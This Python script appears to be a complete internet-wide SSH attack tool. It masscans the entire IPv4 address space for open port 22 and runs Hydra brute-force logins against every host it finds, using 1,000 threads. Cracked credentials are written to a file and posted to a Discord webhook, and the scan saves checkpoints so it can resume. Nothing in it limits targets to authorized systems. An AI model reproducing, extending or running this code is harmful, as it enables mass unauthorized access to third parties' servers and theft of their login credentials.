import os
import queue
import threading
import subprocess
import time
import ipaddress
import json
import requests

DISCORD_STATS_WEBHOOK_URL = "https://discord.com/api/webhooks/your_stats_webhook_here"
DISCORD_HIT_WEBHOOK_URL = "https://discord.com/api/webhooks/your_hit_webhook_here"

UFILE = "users.txt"
PFILE = "passes.txt"
LOGS = "valid_creds.txt"
ELOGS = "error_log.txt"
OUTPUT_FILE = "masscan_output.json"
CHECKPOINT_FILE = "scan_checkpoint.txt"

start_ip = ipaddress.IPv4Address("0.0.0.0")
end_ip = ipaddress.IPv4Address("255.255.255.254")

RATE = "30000"
WORKERS = 1000
PORT = 22
BATCH = 250000

q = queue.Queue()
stats = {"scanned_ips": 0, "hits": 0, "fails": 0, "errors": 0}
active_hydra = 0
hydra_lock = threading.Lock()
current_range = "N/A"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def send_discord_stats():
    embed = {
        "title": "Scan Stats Update",
        "color": 7506394,
        "fields": [
            {"name": "Scanned IPs", "value": str(stats['scanned_ips']), "inline": True},
            {"name": "Hits", "value": str(stats['hits']), "inline": True},
            {"name": "Fails", "value": str(stats['fails']), "inline": True},
            {"name": "Errors", "value": str(stats['errors']), "inline": True},
            {"name": "Active Hydra", "value": str(active_hydra), "inline": True},
            {"name": "Queue Length", "value": str(q.qsize()), "inline": True},
            {"name": "Current Range", "value": current_range, "inline": False}
        ]
    }
    data = {"embeds": [embed]}
    try:
        requests.post(DISCORD_STATS_WEBHOOK_URL, json=data)
    except Exception as e:
        print("Discord stats webhook error:", e)

def send_discord_hit(hit_info):
    embed = {
        "title": "Hydra Hit!",
        "description": hit_info,
        "color": 15158332,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }
    data = {"embeds": [embed]}
    try:
        requests.post(DISCORD_HIT_WEBHOOK_URL, json=data)
    except Exception as e:
        print("Discord hit webhook error:", e)

def discord_stats_periodic():
    while True:
        time.sleep(10800)  # 3 Stunden warten
        send_discord_stats()

def get_last_scanned_ip():
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, "r") as f:
                last_ip_str = f.read().strip()
                # Debug: Uncomment to see checkpoint read value
                # print(f"[DEBUG] Loaded checkpoint: {last_ip_str}")
                return ipaddress.IPv4Address(last_ip_str)
        except Exception as e:
            save_err(f"Checkpoint read error: {e}")
    return start_ip

def save_last_scanned_ip(ip):
    try:
        with open(CHECKPOINT_FILE, "w") as f:
            f.write(str(ip))
        # Debug: Uncomment to see checkpoint saving
        # print(f"[DEBUG] Saved checkpoint: {ip}")
    except Exception as e:
        save_err(f"Checkpoint save error: {e}")

def save_hit(creds):
    with open(LOGS, "a") as f:
        f.write(f"{creds}\n")
    stats["hits"] += 1

def save_err(err):
    with open(ELOGS, "a") as f:
        f.write(f"{err}\n")
    stats["errors"] += 1

def brute(ip):
    global active_hydra
    with hydra_lock:
        active_hydra += 1
    # Debug: Uncomment to log when Hydra starts for an IP
    # print(f"[DEBUG] Running Hydra on {ip}")
    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 4 -T 5 -W 1 -V 2>&1"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
    except Exception as e:
        save_err(f"Hydra exception on {ip}: {e}")
        with hydra_lock:
            active_hydra -= 1
        return
    found = False
    for line in res.splitlines():
        if "[22][ssh]" in line and "login:" in line and "password:" in line and ("success" in line.lower() or "[SUCCESS]" in line):
            # Debug: Uncomment to see successful hits
            # print(f"[DEBUG] Hydra success: {line}")
            save_hit(line)
            send_discord_hit(line)
            found = True
        elif "error" in line.lower():
            save_err(line)
    if not found:
        stats["fails"] += 1
    with hydra_lock:
        active_hydra -= 1

def worker():
    while True:
        ip = q.get()
        if ip is None:
            q.task_done()
            break
        # Debug: Uncomment to see worker processing details
        # print(f"[DEBUG] Worker processing IP: {ip}")
        brute(ip)
        q.task_done()

def scan():
    global current_range
    current_ip = get_last_scanned_ip()
    while current_ip <= end_ip:
        next_ip = min(current_ip + BATCH - 1, end_ip)
        current_range = f"{current_ip} - {next_ip}"
        cmd = (
            f"masscan -p {PORT} --open --rate={RATE} --wait 0 "
            f"--range {str(current_ip)}-{str(next_ip)} "
            f"--output-format=json --output-filename={OUTPUT_FILE} "
            f"--exclude 255.255.255.255"
        )
        # Debug: Uncomment to see the masscan command being executed
        # print(f"[DEBUG] Running: {cmd}")
        subprocess.run(cmd, shell=True)
        try:
            with open(OUTPUT_FILE, "r") as f:
                data = json.load(f)
            for entry in data:
                ip_found = entry.get("ip")
                if ip_found:
                    q.put(ip_found)
                    stats["scanned_ips"] += 1
        except Exception as e:
            # Debug: Uncomment to see parsing errors
            # print(f"[DEBUG] Failed to parse masscan output: {e}")
            save_err(f"Failed to parse masscan output: {e}")
        save_last_scanned_ip(next_ip + 1)
        current_ip = next_ip + 1
        time.sleep(1)

def start_workers():
    threads = []
    for _ in range(WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    return threads

def show_stats():
    while True:
        time.sleep(5)
        clear_screen()
        print("=== Stats ===")
        print(f"Scanned IPs: {stats['scanned_ips']}")
        print(f"Hits: {stats['hits']}")
        print(f"Fails: {stats['fails']}")
        print(f"Errors: {stats['errors']}")
        with hydra_lock:
            current_active_hydra = active_hydra
        print(f"Active Hydra: {current_active_hydra}")
        print(f"Queue Length: {q.qsize()}")
        print(f"Current Range: {current_range}")
        print("==============")

def run():
    # Debug: Uncomment to indicate workers are starting
    # print("[DEBUG] Starting workers...")
    start_workers()
    threading.Thread(target=scan, daemon=True).start()
    threading.Thread(target=show_stats, daemon=True).start()
    threading.Thread(target=discord_stats_periodic, daemon=True).start()
    while True:
        time.sleep(1)

if __name__ == "__main__":
    run()
